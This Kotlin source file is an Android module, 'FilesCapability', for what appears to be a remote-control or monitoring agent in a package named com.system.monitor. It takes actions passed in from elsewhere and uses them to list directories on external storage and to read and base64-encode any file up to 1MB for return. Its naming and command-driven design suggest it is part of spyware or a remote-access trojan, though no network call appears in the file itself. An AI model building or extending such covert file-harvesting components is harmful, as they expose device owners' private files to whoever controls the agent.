package com.system.monitor.capabilities

import android.content.Context
import android.os.Environment
import com.google.gson.Gson
import com.system.monitor.AgentService
import java.io.File

class FilesCapability(private val service: AgentService) : AgentService.Capability {

    private val gson = Gson()

    override fun execute(args: String?): Any {
        val params = gson.fromJson(args ?: "{}", Params::class.java)
        return when (params.action) {
            "list" -> listFiles(params.path ?: Environment.getExternalStorageDirectory().absolutePath)
            "read" -> readFile(params.path ?: "")
            "download" -> downloadFile(params.path ?: "")
            else -> mapOf<String, Any>("error" to "invalid action")
        }
    }

    override fun cleanup() {}

    private fun listFiles(path: String): Map<String, Any> {
        val file = File(path)
        if (!file.exists()) return mapOf<String, Any>("error" to "path_not_found")
        if (!file.isDirectory) return mapOf<String, Any>("error" to "not_a_directory")
        val files = file.listFiles()
        if (files == null) return mapOf<String, Any>("files" to emptyList())
        val result: MutableList<Map<String, Any>> = mutableListOf()
        for (f in files) {
            result.add(mapOf<String, Any>(
                "name" to f.name,
                "path" to f.absolutePath,
                "size" to f.length(),
                "is_directory" to f.isDirectory,
                "last_modified" to f.lastModified()
            ))
        }
        return mapOf<String, Any>("files" to result, "path" to path)
    }

    private fun readFile(path: String): Map<String, Any> {
        val file = File(path)
        if (!file.exists()) return mapOf<String, Any>("error" to "file_not_found")
        if (file.isDirectory) return mapOf<String, Any>("error" to "is_directory")
        val bytes = file.readBytes()
        if (bytes.size > 1024 * 1024) { // 1MB limit
            return mapOf<String, Any>("error" to "file_too_large", "size" to bytes.size)
        }
        val base64 = android.util.Base64.encodeToString(bytes, android.util.Base64.NO_WRAP)
        return mapOf<String, Any>("content" to base64, "size" to bytes.size, "path" to path)
    }

    private fun downloadFile(path: String): Map<String, Any> {
        return readFile(path)
    }

    data class Params(val action: String, val path: String? = null)
}